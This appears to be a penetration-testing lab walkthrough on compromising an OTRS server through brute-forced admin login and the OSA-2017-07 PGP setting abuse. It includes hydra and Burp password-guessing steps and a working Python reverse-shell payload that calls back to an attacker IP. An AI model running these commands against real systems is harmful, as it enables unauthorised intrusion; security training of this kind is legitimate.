Attack Vector 4 - OTRS

OTRS Authenticated Remote Code Execution (OSA-2017-07)

Check the Nessus files

Here is a link from OTRS for login
https://doc.otrs.com/doc/manual/admin/6.0/en/html/first-login.html. This will be related to the installer.html we found earlier.
![13bb87b9bcca668c0d34c7a913574620.png](6a2cefbe73274e7c9e390b3804dc2a83.png)

How to use the web installer
https://doc.otrs.com/doc/manual/admin/6.0/en/html/web-installer.html

This may help in getting a shell but only after we're able to login https://www.exploit-db.com/exploits/43853


https://0ff5ec.com/hydra/
Brute force for root using hydra
`hydra -l root -P /usr/share/wordlists/rockyou.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=240&User=^USER^Password=^PASS^:F=Login failed!"`

# robots.txt
The robots.txt file will be shown if you pretend to be a search engine. In this case, we pretended to be a googlebot.
Here is the webpage that showed us with user-agent string to use: [https://support.google.com/webmasters/answer/1061943?hl=en](https://support.google.com/webmasters/answer/1061943?hl=en)

Here is the netcat command using a googlebot user-agent string:
`printf "GET /robots.txt HTTP/1.1\r\nHost: 10.11.1.39\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)/1.0\r\nAccept: */*\r\n\r\n" | sudo nc 10.11.1.39 80`
Search engines are allowed to look at /otrs/index.pl
![e9dd001762560494e198ce7695a5f402.png](e0f536413ed246fd9c263febbde799a0.png)

# Searcshploit
![f125bd21beaff2f7ee306fa520b8cb35.png](518e04f2e8b8409fa4565a49f8f061bc.png)

Cewl:
`cewl -m 4 -w cewl_otrs.txt http://10.11.1.39/otrs/index.pl`
![c13026bb61bbb4ad400648e721cc6d88.png](963b972782704715a670e3842284c807.png)
Here is the wordlist
[cewl_otrs.txt](3bf084feb45f48bca3aeaaa176faf6d2.txt)


# Burpsuite
Send the index.pl to Intruder
![7a0c415eb13b7a012d09d8935dc78eb4.png](0faa5ea333374168964d42591d6d8968.png)


Payload positions. Use root@localhost, and use sniper attack on password
![4b14d0b946af69a6378f7da52e0404e8.png](22ae25eff5de4bf7aab87e541d0f9186.png)


Payloads is a simple list. Cut and paste the results of the cewl document.
![d87fa7445ae0a973fd21a03a2f9c77a8.png](dbadc10c810b464eb9a90a8112561ca9.png)

The result of the attack. 'otrs' has a length of 570
![d15dbfe24f48c435cec15b4014623b51.png](457a657324ae4b7886b585124584c16f.png)


We have a ticket. What language is this?
[Ticket-2015071510123456-TicketID-1-ArticleID-1.eml](056866cbdd904b208f639c3ecba6dd69.eml)
![63d0d64ade3b0d276a916d8a4c4d0267.png](86b0ecd0c6a04985b6545791036f9dc1.png)


# Exploit 43853 - Remote execution
Upon login, we see it's not in English
![9e7774c5ba353b1eab61f5d96a96f94f.png](e207941b60dd49e2b2fe1cf10559256e.png)

It's in Swedish language
![2b58add65d1f0631c6498776817e95bc.png](07003a222e4047aa93c9389b48c7e7a5.png)

Choose English
![f78299ef0c6639f63c8cfbdcd2c16080.png](618105db284a4ffd95ec8d7916914be4.png)

Verify it's in English
![71b70bd91d1358016892807e43e92b21.png](a15d17de30684baaa73a4bb9509434d1.png)

Now, try the exploit
Open the Admin tab
![04cc8cb38b2a7a6b8a7ffae7a389a9e1.png](d13faee5fe6b4475b3d85f07d721e326.png)
![afce964feee78355d8a89823673423c1.png](9f85bd806ebf43df8fc73c4467f461c9.png)

Open the SysConfig
![1eeb8a43dfcd09ad55dd58aa3fa1d902.png](2d0171797af940ba9c6d01b445f527ee.png)

Find the "Crypt:PGP" subgroup by inputting 'PGP' in the Navigate settings
![acb0a6448d808446299c39686e7a1c28.png](870476f003dd42bca8ce5538bb494843.png)

Update PGP to 'Yes'
![323627e310942d24b6ed6afc5ae5a00b.png](1b3ba2432ff24591a9d4a5e988b74e18.png)

Update PGP::Bin (use the attack IP and port 5678 to:
`/usr/bin/python`
![dce95f0109f21742d457f43702926604.png](9efd8839ae8f4b06a04ccce20b5a34ca.png)


Update PGP::Options (you must attacker IP and port 5678)
`-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.214",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
![fd8ed4d38b94e2717a41a5812dec2312.png](49110add940448b29712611dfd60217a.png)
It's in the exploit, but I also got it from pentest monkey
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Open the Admin tab again
![5ab2c2baedafc3f0dbf9882e33493e13.png](a804b9b6dc1f4cab8982eca3fb00e4ea.png)

Open a netcat listener port 5678
![6adad7b320a98d350c351cbb6fb7fdbf.png](6b81664936f04ba6bf9b5d142fad7c3b.png)

Esecute the code by browsing to
[10.11.1.39/otrs/index.pl?Action=AdminPGP](10.11.1.39/otrs/index.pl?Action=AdminPGP)
![26c2dcc3ab8e488fdabd366c37ba168a.png](9cf3e77020bb4b218dd04a3dc665b171.png)


The feature is disabled! Enable it. It has reset what we did. Let's do it again.
Press update.

Now browse back to 
[10.11.1.39/otrs/index.pl?Action=AdminPGP](10.11.1.39/otrs/index.pl?Action=AdminPGP)

We have a shell!
![e78701d6ec73d432188df5313538afcd.png](053083f7f6cb4179ad8872e67a870321.png)

We are username apache
![8bf0b272e9f912439e2a6ed14f5d1d4d.png](6ee5061f5b1b472aadfd49fe433e5aab.png)

















































